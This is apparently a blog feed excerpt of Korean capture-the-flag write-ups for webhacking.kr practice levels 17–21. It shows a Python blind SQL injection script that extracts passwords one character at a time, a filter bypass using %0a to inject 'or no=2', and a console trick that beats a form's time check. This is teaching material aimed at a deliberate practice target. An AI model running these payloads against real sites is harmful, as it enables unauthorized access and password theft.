        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;True&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Find PW : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+]Finish Password Parsing...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;힘든건 컴퓨터한테 시키면 된다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;no&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;id&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;pw&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;? (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;guest (5)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;admin (5)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;blindsqlinjectionkk (19)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;no=1의 pw를 찾다보니 비밀번호 한자리씩 파싱하는데 시간이 1-2초씩 소비하였다. 5글자 알아내는대도 5분정도 걸린것 같다. no=2의 pw는 소문자 일것으로 추측하고 경우의 수를 줄여 파싱을 진행하였다. (시간은 금이니까 😏)&lt;/p&gt;

&lt;h5 id=&quot;flag--blindsqlinjectionkk&quot;&gt;&lt;strong&gt;flag = blindsqlinjectionkk&lt;/strong&gt;&lt;/h5&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">Blind SQL Injection이라고 되어 있다. 주소창을 보니 no, id, pw값을 입력받고 있다. no에 숫자들을 입력해 보니 True라고 나오는 숫자는 1과 2뿐이다. 따라서 id값은 1과 2이다. 이제 각 id에 맞는 id와 pw를 찾아내야 한다. 1 and length(id)=5 를 이용하여 id의 길이가 5인 것과, pw의 길이가 5인 것을 알아 냈다. 똑같은 방법으로 no가 2인 id와 pw의 길이도 알아내면 id는 5, pw는 19의 길이를 가지고 있다. no id pw 1 ? (5) ? (5) 2 ? (5) ? (19) 이제 아이디를 찾아보자. 보통 5의 길이를 가진 id는 ‘admin’이 있다. 이를 예측해보고 no=1의 id를 substr()를 이용하여 찾아보자. 1 and ascii(substr(id, 1, 1))=97 위 명령어는 no가 1이고, id의 첫번째 인덱스에서 1byte가 ascii코드로 97(‘a’)인지 확인하는 명령어이다. 생각처럼 no=1의 id는 ‘admin’이 아닌것 같다. 하지만 같은 방식으로 no=2의 id를 비교해보니 ‘admin’이 맞았다. no id pw 1 ? (5) ? (5) 2 admin (5) ? (19) 이렇게 하나하나씩 다 비교해 보는 것은 매우 힘든일이다. 한글자 마다 ascii코드 33부터 136까지 다 비교해봐야 하기 때문이다. import requests url = 'http://webhacking.kr/challenge/bonus/bonus-1/index.php?' cookie={'PHPSESSID':'b82bba458acf3b6fd70126be82c02e2f'} pw = '' # no=1 for i in range(1, 6): for j in range(33, 137): query = &quot;no=1 and ascii(substr(pw,&quot;+str(i)+&quot; ,1))=&quot;+str(j) payload = url+query print(&quot;Password Parsing : &quot;+pw+chr(j)) res = requests.get(payload, cookies=cookie) if((res.text).find(&quot;True&quot;)&amp;gt;0): pw += chr(j) print(&quot;Find PW : &quot;+pw) break print(&quot;[+]Finish Password Parsing...&quot;) print(&quot;Password : &quot;+pw) 힘든건 컴퓨터한테 시키면 된다. no id pw 1 ? (5) guest (5) 2 admin (5) blindsqlinjectionkk (19) no=1의 pw를 찾다보니 비밀번호 한자리씩 파싱하는데 시간이 1-2초씩 소비하였다. 5글자 알아내는대도 5분정도 걸린것 같다. no=2의 pw는 소문자 일것으로 추측하고 경우의 수를 줄여 파싱을 진행하였다. (시간은 금이니까 😏) flag = blindsqlinjectionkk</summary></entry><entry><title type="html">[Web.kr]Level 20</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-20.html" rel="alternate" type="text/html" title="[Web.kr]Level 20" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2020</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-20.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 20/image-20180726143450823.png&quot; width=&quot;500px&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;input type=button value=&quot;Submit&quot; onclick=ck()&amp;gt;
&amp;lt;script&amp;gt;
function ck()
{
if(lv5frm.id.value==&quot;&quot;) { lv5frm.id.focus(); return; }
if(lv5frm.cmt.value==&quot;&quot;) { lv5frm.cmt.focus(); return; }
if(lv5frm.hack.value==&quot;&quot;) { lv5frm.hack.focus(); return; }
if(lv5frm.hack.value!=lv5frm.attackme.value) { lv5frm.hack.focus(); return; }
lv5frm.submit();
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;해당 페이지의 주요 코드를 보면 위와 같다. id, cmt, hack값을 입력받고 submit을 한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 20/image-20180726143708550.png&quot; width=&quot;500px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;입력하고 “Submit”하니 “Wrong”이라고 뜬다. time limit:2 인것 보니 2초 안에 해야 되는 것같다.&lt;/p&gt;

&lt;p&gt;그래서 크롬 console을 이용하여 다음 코드를 한번에 입력하였다.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;javascript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lv5frm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nl&quot;&gt;javascript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lv5frm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;javascript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lv5frm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lv5frm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attackme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;javasecript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 20/image-20180726144251890.png&quot; alt=&quot;image-20180726144251890&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 20/image-20180726144230888.png&quot; width=&quot;500px&quot; /&gt;&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">&amp;lt;input type=button value=&quot;Submit&quot; onclick=ck()&amp;gt; &amp;lt;script&amp;gt; function ck() { if(lv5frm.id.value==&quot;&quot;) { lv5frm.id.focus(); return; } if(lv5frm.cmt.value==&quot;&quot;) { lv5frm.cmt.focus(); return; } if(lv5frm.hack.value==&quot;&quot;) { lv5frm.hack.focus(); return; } if(lv5frm.hack.value!=lv5frm.attackme.value) { lv5frm.hack.focus(); return; } lv5frm.submit(); } &amp;lt;/script&amp;gt; 해당 페이지의 주요 코드를 보면 위와 같다. id, cmt, hack값을 입력받고 submit을 한다. 입력하고 “Submit”하니 “Wrong”이라고 뜬다. time limit:2 인것 보니 2초 안에 해야 되는 것같다. 그래서 크롬 console을 이용하여 다음 코드를 한번에 입력하였다. javascript:(lv5frm.id.value='1'); javascript:(lv5frm.cmt.value='1'); javascript:(lv5frm.hack.value=lv5frm.attackme.value); javasecript:ck();</summary></entry><entry><title type="html">[Web.kr]Level 19</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-19.html" rel="alternate" type="text/html" title="[Web.kr]Level 19" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2019</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-19.html">&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: Cannot modify header information - headers already sent by (output started at /home/hosting_users/webhacking/www/challenge/javascript/js6.html:11) in /home/hosting_users/webhacking/www/challenge/javascript/js6.html on line 29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;에러를 뿜는다…  문제 터진듯…&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">Warning: Cannot modify header information - headers already sent by (output started at /home/hosting_users/webhacking/www/challenge/javascript/js6.html:11) in /home/hosting_users/webhacking/www/challenge/javascript/js6.html on line 29 에러를 뿜는다… 문제 터진듯…</summary></entry><entry><title type="html">[Web.kr]Level 18</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-18.html" rel="alternate" type="text/html" title="[Web.kr]Level 18" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2018</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-18.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 18/1803B656-F722-44A1-B725-4C4C33E1B6E2.png&quot; alt=&quot;1803B656-F722-44A1-B725-4C4C33E1B6E2&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eregi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; |/|\(|\)|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|\||&amp;amp;|union|select|from|0x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no hack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;select id from challenge18_table where id='guest' and no=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET[no]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; 

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;guest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hi guest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hi admin!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;소스코드의 중요 부위는 이부분이다.&lt;/p&gt;

&lt;p&gt;GET방식으로 no값을 입력받아 eregi로 해당 문자열들을 필터링 하고,&lt;/p&gt;

&lt;p&gt;mysql 쿼리문으로 id=’geust’가 입력한 no값으로 쿼리를 날리고, 해당 쿼리의 첫번째 깞이 ‘admin’이면 문제가 풀린다.&lt;/p&gt;

&lt;p&gt;no=1을 날리니 “hi guest”라고 출력되었다. 그러면 admin의 id를 대충 유추해보면 0 또는 2일것 같다고 유추하였다.&lt;/p&gt;

&lt;h5 id=&quot;️1번째-문제&quot;&gt;‼️1번째 문제&lt;/h5&gt;

&lt;p&gt;그래서 no값에 0이나 2를 넣어 보냈더니 아무런 반응이 없었다.&lt;/p&gt;

&lt;p&gt;&lt;u&gt;id가 guest로 설정&lt;/u&gt;되어 있기 때문이라고 생각하고, id값과 상관없이 id를 조회하도록 하였다.&lt;/p&gt;

&lt;p&gt;…where id = ‘guest’ and no=&lt;strong&gt;1 or no=2&lt;/strong&gt; 라고 바꾸면 될 것같다.&lt;/p&gt;

&lt;h5 id=&quot;️2번째-문제&quot;&gt;‼️2번째 문제&lt;/h5&gt;

&lt;p&gt;따라서 &lt;code class=&quot;highlighter-rouge&quot;&gt;1 or no=2&lt;/code&gt; 라고 입력하였으나, eregi에서 &lt;u&gt;공백을 필터링&lt;/u&gt;하고 있다.&lt;/p&gt;

&lt;p&gt;따라서 공백대신 우회 할만한 것들을 찾아보니, ‘/’을 이용한 주석이나, ‘\t’, ‘\n’ 이 있다고 한다. ‘\t’와 ‘/’는 필터링 되고 있으니 ‘\n’을 사용하면 될 것같다.&lt;/p&gt;

&lt;h5 id=&quot;️3번째-문제&quot;&gt;‼️3번째 문제&lt;/h5&gt;

&lt;p&gt;1\nor\nno=2 라고 입력하였더니 ‘'를 urlencode시켜버려 원하는 값이 들어가지 않았다. 그래서  ‘\n’의 인코딩 된 값들 넣어주었다.&lt;/p&gt;

&lt;p&gt;파이썬으로 확인해보니 ‘\n’은 0xa이고 urlencode형식으로 %0a라고 입력하면 될 것 같다.&lt;/p&gt;

&lt;p&gt;정답 : &lt;code class=&quot;highlighter-rouge&quot;&gt;1%0aor%0ano=2&lt;/code&gt;&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">&amp;lt;? if($_GET[no]) { if(eregi(&quot; |/|\(|\)|\t|\||&amp;amp;|union|select|from|0x&quot;,$_GET[no])) exit(&quot;no hack&quot;); $q=@mysql_fetch_array(mysql_query(&quot;select id from challenge18_table where id='guest' and no=$_GET[no]&quot;)); if($q[0]==&quot;guest&quot;) echo (&quot;hi guest&quot;); if($q[0]==&quot;admin&quot;) { @solve(); echo (&quot;hi admin!&quot;); } } ?&amp;gt; 소스코드의 중요 부위는 이부분이다. GET방식으로 no값을 입력받아 eregi로 해당 문자열들을 필터링 하고, mysql 쿼리문으로 id=’geust’가 입력한 no값으로 쿼리를 날리고, 해당 쿼리의 첫번째 깞이 ‘admin’이면 문제가 풀린다. no=1을 날리니 “hi guest”라고 출력되었다. 그러면 admin의 id를 대충 유추해보면 0 또는 2일것 같다고 유추하였다. ‼️1번째 문제 그래서 no값에 0이나 2를 넣어 보냈더니 아무런 반응이 없었다. id가 guest로 설정되어 있기 때문이라고 생각하고, id값과 상관없이 id를 조회하도록 하였다. …where id = ‘guest’ and no=1 or no=2 라고 바꾸면 될 것같다. ‼️2번째 문제 따라서 1 or no=2 라고 입력하였으나, eregi에서 공백을 필터링하고 있다. 따라서 공백대신 우회 할만한 것들을 찾아보니, ‘/’을 이용한 주석이나, ‘\t’, ‘\n’ 이 있다고 한다. ‘\t’와 ‘/’는 필터링 되고 있으니 ‘\n’을 사용하면 될 것같다. ‼️3번째 문제 1\nor\nno=2 라고 입력하였더니 ‘'를 urlencode시켜버려 원하는 값이 들어가지 않았다. 그래서 ‘\n’의 인코딩 된 값들 넣어주었다. 파이썬으로 확인해보니 ‘\n’은 0xa이고 urlencode형식으로 %0a라고 입력하면 될 것 같다. 정답 : 1%0aor%0ano=2</summary></entry><entry><title type="html">[Web.kr]Level 17</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-17.html" rel="alternate" type="text/html" title="[Web.kr]Level 17" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2017</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-17.html">&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;Challenge 17&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=black&amp;gt;
&amp;lt;font color=red size=10&amp;gt;&amp;lt;/font&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;form name=login&amp;gt;
&amp;lt;input type=passwd name=pw&amp;gt;&amp;lt;input type=button onclick=sub() value=&quot;check&quot;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;script&amp;gt;
unlock=100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10-100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+9999999999;

function sub(){ if(login.pw.value==unlock){ alert(&quot;Password is &quot;+unlock/10); }else { alert(&quot;Wrong&quot;);  }}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 17/573E6EAB-9DF1-4715-978F-E02B2EE3D3B3.png&quot; alt=&quot;573E6EAB-9DF1-4715-978F-E02B2EE3D3B3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;unlock 값과 패스워드가 같으면 끝.&lt;/p&gt;

&lt;p&gt;계산은… 크롬이 대신 해준다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 17/F84ADA0F-7476-48D2-A33E-6835D16C2114.png&quot; alt=&quot;F84ADA0F-7476-48D2-A33E-6835D16C2114&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;flag--9997809307&quot;&gt;flag : 999780930.7&lt;/h4&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Challenge 17&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body bgcolor=black&amp;gt; &amp;lt;font color=red size=10&amp;gt;&amp;lt;/font&amp;gt; &amp;lt;p&amp;gt; &amp;lt;form name=login&amp;gt; &amp;lt;input type=passwd name=pw&amp;gt;&amp;lt;input type=button onclick=sub() value=&quot;check&quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; 